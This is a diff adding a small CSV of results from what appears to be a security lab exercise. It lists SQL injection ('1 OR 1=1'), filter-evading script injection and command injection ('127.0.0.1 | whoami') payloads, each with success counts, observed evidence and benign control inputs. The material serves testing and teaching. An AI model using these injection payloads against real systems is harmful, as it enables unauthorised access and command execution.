@@ -1,0 +1,7 @@
+class,payload,successes,trials,evidence,error
+sqli,1 OR 1=1,3,3,additional synthetic user row (Surname: Smith) returned,
+sqli,1,0,3,,
+xss,<ScRiPt>window.__HW2_XSS__=1</ScRiPt>,3,3,unique script element survived unescaped,
+xss,Ada,0,3,,
+cmdi,127.0.0.1 | whoami,3,3,bounded whoami output (www-data) reached the response,
+cmdi,127.0.0.1,0,3,,
